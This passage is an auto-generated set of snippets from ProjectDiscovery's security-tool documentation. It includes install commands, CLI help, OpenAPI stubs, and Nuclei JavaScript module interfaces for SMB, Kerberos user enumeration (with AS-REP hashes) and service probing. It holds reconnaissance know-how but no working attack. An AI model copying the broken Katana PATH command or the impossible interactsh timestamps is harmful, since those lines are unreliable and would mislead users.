SupportV1?: boolean;\n  Version?: SMBVersions;\n}\n```\n\n----------------------------------------\n\nTITLE: ServiceSMB Interface Definition in TypeScript\nDESCRIPTION: TypeScript interface defining properties for SMB service configuration and metadata. Includes DNS and NetBIOS naming properties, forest name, OS version, and signing settings. All properties are optional.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.ServiceSMB.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface ServiceSMB {\n  DNSComputerName?: string;\n  DNSDomainName?: string;\n  ForestName?: string;\n  NetBIOSComputerName?: string;\n  NetBIOSDomainName?: string;\n  OSVersion?: string;\n  SigningEnabled?: boolean;\n  SigningRequired?: boolean;\n}\n```\n\n----------------------------------------\n\nTITLE: Generating PDCP API Reference Documentation for ProjectDiscovery\nDESCRIPTION: This command runs a shell script that generates the API reference documentation for the PDCP API. It likely uses the downloaded OpenAPI specification to create documentation files.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/Home.mdx#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n./bin/generate-api.sh\n```\n\n----------------------------------------\n\nTITLE: OpenAPI DELETE Endpoint Specification\nDESCRIPTION: OpenAPI specification header defining a DELETE endpoint at /v1/asset/enumerate path. Initial configuration for API documentation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/delete-assets-in-bulk.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/asset/enumerate\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Definition for Admin Scan Token\nDESCRIPTION: Defines the OpenAPI specification for the administrative endpoint that retrieves scan tokens. This is a RESTful GET endpoint at /v1/admin/scan/token path.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/get-token-usage-admin.mdx#2025-04-12_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /v1/admin/scan/token\n```\n\n----------------------------------------\n\nTITLE: Authenticating Nuclei with PDCP\nDESCRIPTION: Command to initiate Nuclei authentication process for connecting with ProjectDiscovery Cloud Platform. This command prompts for the API key to establish the connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/pdcp-setup.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnuclei -auth\n```\n\n----------------------------------------\n\nTITLE: Running Chaos in Silent Mode\nDESCRIPTION: Demonstrates how to run Chaos without any output using the -silent flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nchaos -d uber.com -silent\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Downloading Scan Error Logs\nDESCRIPTION: This YAML snippet specifies the OpenAPI path for retrieving error logs from a specific scan. It defines a GET endpoint that uses a scan_id path parameter to identify which scan's error logs should be downloaded.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/elog/download-elogs-of-given-scan-id.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/{scan_id}/error_log/download\n```\n\n----------------------------------------\n\nTITLE: Defining Realm Interface Properties in TypeScript\nDESCRIPTION: Declares optional properties for the Realm interface including AdminServer, DefaultDomain, KDC, KPasswdServer, MasterKDC, and Realm. These properties define various aspects of a Kerberos realm configuration.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.Realm.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **AdminServer**: `string`[]\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **DefaultDomain**: `string`\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **KDC**: `string`[]\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **KPasswdServer**: `string`[]\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **MasterKDC**: `string`[]\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **Realm**: `string`\n```\n\n----------------------------------------\n\nTITLE: Defining HeaderLog Interface for SMB Protocol in TypeScript\nDESCRIPTION: This code snippet defines the HeaderLog interface for the SMB protocol. It includes optional properties for Command, Credits, Flags, ProtocolID, and Status, which are essential components of an SMB header.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.HeaderLog.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface HeaderLog {\n  Command?: number;\n  Credits?: number;\n  Flags?: number;\n  ProtocolID?: Uint8Array;\n  Status?: number;\n}\n```\n\n----------------------------------------\n\nTITLE: Katana Output CLI Options\nDESCRIPTION: Available command-line options for controlling Katana's output behavior\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_32\n\nLANGUAGE: console\nCODE:\n```\nkatana -h output\n\nOUTPUT:\n   -o, -output string                file to write output to\n   -sr, -store-response              store http requests/responses\n   -srd, -store-response-dir string  store http requests/responses to custom directory\n   -j, -json                         write output in JSONL(ines) format\n   -nc, -no-color                    disable output content coloring (ANSI escape codes)\n   -silent                           display output only\n   -v, -verbose                      display verbose output\n   -version                          display project version\n```\n\n----------------------------------------\n\nTITLE: Multiple Matcher DNS Template for Specific CNAME Targets\nDESCRIPTION: An advanced DNS template that demonstrates using multiple matchers with OR condition to detect if a domain's CNAME record points to either zendesk.com or github.io. Each matcher is named for better result identification.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/dns-examples.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: multiple-matcher\n\ninfo:\n  name: Test DNS Template\n  author: pdteam\n  severity: info\n\ndns:\n  - name: \"{{FQDN}}\"\n    type: CNAME\n    class: inet\n    recursion: true\n    retries: 5\n    matchers-condition: or\n    matchers:\n      - type: word\n        name: zendesk\n        words:\n          - \"zendesk.com\"\n      - type: word\n        name: github\n        words:\n          - \"github.io\"\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for Deleting User Team\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the DELETE /v1/user/team endpoint. It specifies the API path and HTTP method for deleting a user's team.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/delete-team.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/user/team\n```\n\n----------------------------------------\n\nTITLE: Adding Go bin path to system paths on OSX or Linux\nDESCRIPTION: These commands add the Go bin path to the system paths on OSX or Linux. This is necessary to run Katana from any directory after installation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/install.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\necho export $PATH=$PATH:$HOME/go/bin >> $home/.bashrc\nsource $home/.bashrc\n```\n\n----------------------------------------\n\nTITLE: Defining SMBCapabilities Interface Properties in TypeScript\nDESCRIPTION: TypeScript interface definition that specifies optional boolean properties for SMB protocol capabilities including multi-channel support, directory leasing, encryption, DFS support, large MTU, and persistence.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.SMBCapabilities.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface SMBCapabilities {\n    MultiChan?: boolean;\n    Persist?: boolean;\n    DirLeasing?: boolean;\n    Encryption?: boolean;\n    DFSSupport?: boolean;\n    Leasing?: boolean;\n    LargeMTU?: boolean;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI PATCH Operation for Scans Endpoint\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a PATCH operation on the /v1/scans/{scan_id} endpoint. It specifies the API path and HTTP method for updating scan resources.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/update-scan.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /v1/scans/{scan_id}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Asset Enumeration Export Endpoint\nDESCRIPTION: OpenAPI specification defining the GET endpoint for exporting asset enumeration results by ID. The endpoint path includes the enumeration ID as a path parameter.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/export-enumeration.mdx#2025-04-12_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /v1/asset/enumerate/{enum_id}/export\n```\n\n----------------------------------------\n\nTITLE: Enabling Automatic Scan Result Upload in PDCP\nDESCRIPTION: Configures all scans to automatically upload results to PDCP by setting the ENABLE_CLOUD_UPLOAD environment variable to true.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/advanced.mdx#2025-04-12_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nexport ENABLE_CLOUD_UPLOAD=true\n```\n\n----------------------------------------\n\nTITLE: Displaying dnsx Help Options in Console\nDESCRIPTION: This snippet shows the complete list of command-line options available in dnsx. It includes input options, query types, filtering, probing, rate limiting, update settings, output formats, debugging, and configuration options.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nINPUT:\n   -l, -list string      list of sub(domains)/hosts to resolve (file or stdin)\n   -d, -domain string    list of domain to bruteforce (file or comma separated or stdin)\n   -w, -wordlist string  list of words to bruteforce (file or comma separated or stdin)\n\nQUERY:\n   -a      query A record (default)\n   -aaaa   query AAAA record\n   -cname  query CNAME record\n   -ns     query NS record\n   -txt    query TXT record\n   -srv    query SRV record\n   -ptr    query PTR record\n   -mx     query MX record\n   -soa    query SOA record\n   -axfr   query AXFR\n   -caa    query CAA record\n   -any    query ANY record\n\nFILTER:\n   -re, -resp          display dns response\n   -ro, -resp-only     display dns response only\n   -rc, -rcode string  filter result by dns status code (eg. -rcode noerror,servfail,refused)\n\nPROBE:\n   -cdn  display cdn name\n   -asn  display host asn information\n\nRATE-LIMIT:\n   -t, -threads int      number of concurrent threads to use (default 100)\n   -rl, -rate-limit int  number of dns request/second to make (disabled as default) (default -1)\n\nUPDATE:\n   -up, -update                 update dnsx to latest version\n   -duc, -disable-update-check  disable automatic dnsx update check\n\nOUTPUT:\n   -o, -output string  file to write output\n   -j, -json           write output in JSONL(ines) format\n   -omit-raw, -or      omit raw dns response from jsonl output\n\nDEBUG:\n   -hc, -health-check  run diagnostic check up\n   -silent             display only results in the output\n   -v, -verbose        display verbose output\n   -raw, -debug        display raw dns response\n   -stats              display stats of the running scan\n   -version            display version of dnsx\n\nOPTIMIZATION:\n   -retry int                number of dns attempts to make (must be at least 1) (default 2)\n   -hf, -hostsfile           use system host file\n   -trace                    perform dns tracing\n   -trace-max-recursion int  Max recursion for dns trace (default 32767)\n   -resume                   resume existing scan\n   -stream                   stream mode (wordlist, wildcard, stats and stop/resume will be disabled)\n\nCONFIGURATIONS:\n   -r, -resolver string          list of resolvers to use (file or comma separated)\n   -wt, -wildcard-threshold int  wildcard filter threshold (default 5)\n   -wd, -wildcard-domain string  domain name for wildcard filtering (other flags will be ignored)\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Export List Endpoint Specification\nDESCRIPTION: YAML specification for the GET /v1/export/list API endpoint that defines the format for retrieving export listings.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/export/get-export-list-for-user.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/export/list\n```\n\n----------------------------------------\n\nTITLE: Defining EnumerateUserResponse Interface in TypeScript\nDESCRIPTION: TypeScript interface definition for EnumerateUserResponse that contains three optional properties: ASREPHash (string), Error (string), and Valid (boolean). This interface is used to structure the response from Kerberos user enumeration operations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.EnumerateUserResponse.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface EnumerateUserResponse {\n    ASREPHash?: string;    // Defined in kerberos.ts:297\n    Error?: string;        // Defined in kerberos.ts:299\n    Valid?: boolean;      // Defined in kerberos.ts:295\n}\n```\n\n----------------------------------------\n\nTITLE: Checking RDP Server Availability in JavaScript\nDESCRIPTION: This function checks if a given host and port are running an RDP server. It returns an IsRDPResponse object containing a boolean indicating success, any error message, and the name of the OS if the connection is successful.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rdp.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst rdp = require('nuclei/rdp');\nconst isRDP = rdp.IsRDP('acme.com', 3389);\nlog(toJSON(isRDP));\n```\n\n----------------------------------------\n\nTITLE: Nuclei Command with Verbose Output\nDESCRIPTION: This command shows Nuclei's verbose output when running with an OpenAPI schema. It demonstrates how Nuclei logs skipped optional parameters and reports missing required parameters.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/input-formats.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n ./nuclei -l rest-openapi.yaml -im openapi -V \"X-API-Key=23\" \n\n                           __     _\n         ____  __  _______/ /__  (_)\n        / __ \\/ / / / ___/ / _ \\/ /\n       / / / / /_/ / /__/ /  __/ /\n      /_/ /_/\\__,_/\\___/_/\\___/_/   v3.2.0\n\n            projectdiscovery.io\n\n    [VER] openapi: skipping optional param (scan_ids) in (query) in request [GET] /results/filters due to missing value (scan_ids)\n    [VER] openapi: skipping optional param (severity) in (query) in request [GET] /results/filters due to missing value (severity)\n    ...\n    [VER] openapi: skipping optional param (template) in (query) in request [GET] /results/filters due to missing value (template)\n    [VER] openapi: skipping optional param (host) in (query) in request [GET] /results/filters due to missing value (host)\n    [ERR] openapi: Found 3 missing parameters, use -skip-format-validation flag to skip requests or update missing parameters generated in required_openapi_params.yaml file,you can also specify these vars using -var flag in (key=value) format\n```\n\n----------------------------------------\n\nTITLE: Verifying Go Installation in Linux Terminal\nDESCRIPTION: Command to verify the installed Go version to ensure you have the latest version (v1.21 at the time of writing).\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/nuclei-setup.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo version\n```\n\n----------------------------------------\n\nTITLE: Using IsTelnet Function with Telnet Module\nDESCRIPTION: Demonstrates how to use the telnet module to check if a host is running a telnet service on a specific port. The example shows importing the telnet module, calling IsTelnet function, and logging the response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/telnet.IsTelnetResponse.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst telnet = require('nuclei/telnet');\nconst isTelnet = telnet.IsTelnet('acme.com', 23);\nlog(toJSON(isTelnet));\n```\n\n----------------------------------------\n\nTITLE: Checking GOPATH Environment Variable in Linux\nDESCRIPTION: Command to verify your GOPATH environment variable which is needed to update your PATH for Nuclei installation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/nuclei-setup.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngo env | grep GOPATH\n```\n\n----------------------------------------\n\nTITLE: Defining SMB NegotiationLog Interface Properties in TypeScript\nDESCRIPTION: TypeScript interface definition specifying optional properties for SMB negotiation logging including authentication types, capabilities, dialect revision, header logs, security mode, server GUID, and timing information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.NegotiationLog.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface NegotiationLog {\n    AuthenticationTypes?: string[];\n    SecurityMode?: number;\n    DialectRevision?: number;\n    ServerGuid?: Uint8Array;\n    Capabilities?: number;\n    SystemTime?: number;\n    ServerStartTime?: number;\n    HeaderLog?: HeaderLog;\n}\n```\n\n----------------------------------------\n\nTITLE: Extending CSSType Definitions with Module Augmentation\nDESCRIPTION: Example of using TypeScript module augmentation to extend CSSType definitions. It shows how to add missing properties, CSS custom properties, and allow any property.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_9\n\nLANGUAGE: typescript\nCODE:\n```\n// My css.d.ts file\nimport type * as CSS from 'csstype';\n\ndeclare module 'csstype' {\n  interface Properties {\n    // Add a missing property\n    WebkitRocketLauncher?: string;\n\n    // Add a CSS Custom Property\n    '--theme-color'?: 'black' | 'white';\n\n    // Allow namespaced CSS Custom Properties\n    [index: `--theme-${string}`]: any;\n    \n    // Allow any CSS Custom Properties\n    [index: `--${string}`]: any;\n\n    // ...or allow any other property\n    [index: string]: any;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Scan History Retrieval\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the GET endpoint to retrieve scan history. It specifies the path parameters and expected responses.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/get-scan-history.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/{scanId}/history\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Definition for Getting User Tunnels\nDESCRIPTION: YAML definition for the OpenAPI GET endpoint that retrieves user tunnels.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/users/get-tunnels-list.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/user/tunnels\n```\n\n----------------------------------------\n\nTITLE: Reloading Bash Configuration After PATH Update\nDESCRIPTION: Command to reload the Bash shell configuration after updating the PATH environment variable.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/nuclei-setup.mdx#2025-04-12_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nsource ~/.bashrc\n```\n\n----------------------------------------\n\nTITLE: Command Line Tool Reference - dnsx\nDESCRIPTION: Basic command syntax example for dnsx tool used in terminal environments.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/overview.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ndnsx\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Stopping Asset Enumeration\nDESCRIPTION: This snippet defines the OpenAPI specification for stopping an asset enumeration process using its ID through a POST request.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/stop-enumeration.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/asset/enumerate/{enumerate_id}/stop\n```\n\n----------------------------------------\n\nTITLE: Defining EntryAttribute Interface in TypeScript for LDAP Module\nDESCRIPTION: This code snippet defines the EntryAttribute interface used in the LDAP module. It specifies three optional properties: ByteValues, Name, and Values, representing different aspects of an LDAP entry attribute.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.EntryAttribute.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface EntryAttribute {\n  ByteValues?: Uint8Array;\n  Name?: string;\n  Values?: string[];\n}\n```\n\n----------------------------------------\n\nTITLE: Defining SQLResult Interface in TypeScript\nDESCRIPTION: TypeScript interface definition for SQL query results containing optional columns array and count properties. Used for structuring PostgreSQL query responses in JavaScript/TypeScript implementations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/postgres.SQLResult.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface SQLResult {\n    Count?: number;     // Optional count property\n    Columns?: string[]; // Optional array of column names\n}\n```\n\n----------------------------------------\n\nTITLE: Installing httpx using Go\nDESCRIPTION: Installs ProjectDiscovery's httpx tool using Go package manager.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/httpx/cmd/httpx@latest\n```\n\n----------------------------------------\n\nTITLE: Nginx Reverse Proxy Configuration\nDESCRIPTION: Nginx configuration for running interactsh-server behind a reverse proxy with custom ports\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_4\n\nLANGUAGE: conf\nCODE:\n```\n# http/https\nhttp {\n   server {\n      listen 443 ssl;\n      server_name mysite.com;\n      ssl_certificate /etc/nginx/interactsh.pem;\n      ssl_certificate_key /etc/nginx/interactsh.key;\n\n      location / {\n         proxy_pass https://interachsh.mysite.com:80/;\n         proxy_set_header Host $host;\n         proxy_set_header X-Real-IP $remote_addr;\n         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n         proxy_set_header X-Forwarded-Proto $scheme;\n      }        \n   }\n}\n\nstream {\n   # smtp\n   server {\n      listen 25;\n      proxy_pass interachsh.mysite.com:8025;\n   }\n\n   # dns\n   server {\n      listen 53;\n      proxy_pass interachsh.mysite.com:8053;\n   }\n   server {\n      listen 53 udp;\n      proxy_pass interachsh.mysite.com:8053;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for Rsync Server in JavaScript\nDESCRIPTION: This snippet shows how to use the IsRsync method to check if a host is running an Rsync server. It takes a host and port as parameters and returns an IsRsyncResponse object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rsync.RsyncClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst rsync = require('nuclei/rsync');\nconst isRsync = rsync.IsRsync('acme.com', 873);\nlog(toJSON(isRsync));\n```\n\n----------------------------------------\n\nTITLE: Specifying External Code File in Nuclei\nDESCRIPTION: References an external file as the source code to be executed by the specified engine within a Nuclei template.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/code.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nsource: helpers/code/pyfile.py\n```\n\n----------------------------------------\n\nTITLE: Downloading Cloudlist Binary\nDESCRIPTION: This URL leads to the GitHub releases page for Cloudlist, where users can download the latest binary for their operating system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/install.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nhttps://github.com/projectdiscovery/cloudlist/releases/\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Template Early Access\nDESCRIPTION: OpenAPI specification for accessing a template with early access rights. This endpoint requires the ID parameter to identify which template to retrieve.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/get-early-template.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/template/early/{id}\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Exporting Scan Results in YAML\nDESCRIPTION: This code defines an OpenAPI endpoint specification for exporting scan results. It uses the POST HTTP method with the path '/v1/scans/results/export'.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/export/export-filtered-scan-results.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/scans/results/export\n```\n\n----------------------------------------\n\nTITLE: Configuring Team ID for Nuclei Scans in Bash\nDESCRIPTION: Commands for setting the Team ID when uploading Nuclei scan results to a team workspace in ProjectDiscovery Cloud Platform. This can be done via CLI option or environment variable.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/internal-scan.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n# CLI Option:\nnuclei -tid XXXXXX -cloud-upload\n\n# ENV Variable:\nexport PDCP_TEAM_ID=XXXXX\n```\n\n----------------------------------------\n\nTITLE: Installing Chaos Client using Go\nDESCRIPTION: This command installs the latest version of ProjectDiscovery's Chaos Client using Go. It requires the Go programming language to be installed on the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Route Definition - Get User Team\nDESCRIPTION: OpenAPI YAML specification for the GET /v1/user/team endpoint that retrieves team information for a user.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/get-team.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/user/team\n```\n\n----------------------------------------\n\nTITLE: Waiting for Page Events in Nuclei Headless Protocol\nDESCRIPTION: This snippet demonstrates various waiting actions such as 'waitfcp', 'waitfmp', 'waitdom', 'waitload', and 'waitidle' to synchronize actions with page loading events.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\naction: waitfcp\n\n---\n\naction: waitfmp\n\n---\n\naction: waitdom\n\n---\n\naction: waitload\n\n---\n\naction: waitidle\n```\n\n----------------------------------------\n\nTITLE: Running interactsh-client with Basic Output\nDESCRIPTION: This snippet demonstrates the basic usage of interactsh-client, which generates a unique payload for OOB testing and displays minimal interaction output.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: console\nCODE:\n```\ninteractsh-client\n\n    _       __                       __       __  \n   (_)___  / /____  _________ ______/ /______/ /_ \n  / / __ \\/ __/ _ \\/ ___/ __ '/ ___/ __/ ___/ __ \\\n / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /\n/_/_/ /_/\\__/\\___/_/   \\__,_/\\___/\\__/____/_/ /_/ v0.0.5\n\n        projectdiscovery.io\n\n[INF] Listing 1 payload for OOB Testing\n[INF] c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro\n\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received DNS interaction (A) from 172.253.226.100 at 2021-26-26 12:26\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received DNS interaction (AAAA) from 32.3.34.129 at 2021-26-26 12:26\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received HTTP interaction from 43.22.22.50 at 2021-26-26 12:26\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received DNS interaction (MX) from 43.3.192.3 at 2021-26-26 12:26\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received DNS interaction (TXT) from 74.32.183.135 at 2021-26-26 12:26\n[c23b2la0kl1krjcrdj10cndmnioyyyyyn] Received SMTP interaction from 32.85.166.50 at 2021-26-26 12:26\n```\n\n----------------------------------------\n\nTITLE: Initializing VNCClient in JavaScript\nDESCRIPTION: Example of how to create a new VNCClient instance using the vnc module in nuclei scripts.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/vnc.VNCClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst vnc = require('nuclei/vnc');\nconst client = new vnc.Client();\n```\n\n----------------------------------------\n\nTITLE: Installing uncover using Go\nDESCRIPTION: This command installs the latest version of uncover using Go's package manager. It requires Go to be installed on the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/uncover/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/uncover/cmd/uncover@latest\n```\n\n----------------------------------------\n\nTITLE: Pulling dnsx Docker image\nDESCRIPTION: This command pulls the latest Docker image of dnsx from ProjectDiscovery's repository.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/install.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ndocker pull projectdiscovery/dnsx:latest\n```\n\n----------------------------------------\n\nTITLE: Installing JSDoc-to-Markdown for ProjectDiscovery Documentation\nDESCRIPTION: This command installs the JSDoc-to-Markdown tool globally using npm. It's used to generate markdown documentation from JSDoc comments in the project's JavaScript files.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/Home.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nnpm install -g jsdoc-to-markdown\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for GitHub Template Retrieval Endpoint in YAML\nDESCRIPTION: This YAML snippet defines an OpenAPI specification for a GET endpoint that retrieves template information from GitHub using a template ID parameter. The endpoint follows the pattern '/v1/template/github/{id}'.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/get-github-template.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/template/github/{id}\n```\n\n----------------------------------------\n\nTITLE: Configuring Consul Provider in YAML\nDESCRIPTION: Example configuration block for integrating Hashicorp Consul with Cloudlist. Requires the Consul server URL and optional authentication details.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: consul\n  consul_url: http://localhost:8500/\n  # consul_ca_file: <path-to-ca-file>.pem\n  # consul_cert_file: <path-to-cert-file>.pem\n  # consul_key_file: <path-to-key-file>.pem\n  # consul_http_token: <consul-token>\n  # consul_http_auth: <consul-http-auth-value>\n```\n\n----------------------------------------\n\nTITLE: Generating JSDoc Documentation\nDESCRIPTION: Script execution command to generate JavaScript protocol documentation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/README.md#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n./bin/jsdocs.sh\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for Template Leaderboard Endpoint in 